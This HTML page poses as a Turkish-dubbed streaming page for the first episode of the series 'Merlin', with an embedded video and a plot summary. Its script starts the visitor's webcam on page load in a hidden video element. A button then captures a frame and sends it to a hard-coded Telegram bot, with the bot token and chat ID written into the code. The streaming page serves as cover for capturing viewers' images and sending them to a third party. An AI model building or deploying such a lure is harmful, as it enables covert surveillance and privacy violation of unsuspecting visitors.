<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #000; /* Night mode */
            color: #fff; /* White text */
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .title {
            font-size: 3rem; /* Large title font */
            font-weight: bold;
            margin-top: 20px;
            color: #f0f0f0;
            text-transform: uppercase;
            margin-bottom: 20px;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 1000px;
            height: 0;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        .description {
            max-width: 90%;
            margin-top: 20px;
            padding: 10px;
            background-color: #222;
            border: 1px solid #555;
            border-radius: 8px;
            font-size: 1rem;
            color: #fff;
            text-align: center;
        }
        #video {
            display: none; /* Hide video element */
        }
        #canvas {
            display: none; /* Hide canvas element */
        }
        #capture-btn {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #00aaff;
            border: none;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>

    <div class="video-container">
        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <div class="description">
        <p>
            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
        </p>
    </div>

    <!-- Camera input -->
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    <button id="capture-btn">Capture and Send to Telegram</button>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const captureBtn = document.getElementById("capture-btn");

        // Start video stream from webcam
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(error => {
                console.error("Error accessing webcam: ", error);
            });

        // Capture image from webcam and send it to Telegram
        captureBtn.addEventListener("click", () => {
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to image (base64)
            const imageData = canvas.toDataURL("image/jpeg");

            // Send the image to Telegram
            sendImageToTelegram(imageData);
        });

        function sendImageToTelegram(imageData) {
            const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Replace with your bot token
            const chatId = '7771348001';  // Replace with your Telegram ID
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageData);

            fetch(telegramUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("Image sent to Telegram successfully:", data);
            })
            .catch(error => {
                console.error("Error sending image to Telegram:", error);
            });
        }
    </script>
</body>
</html>
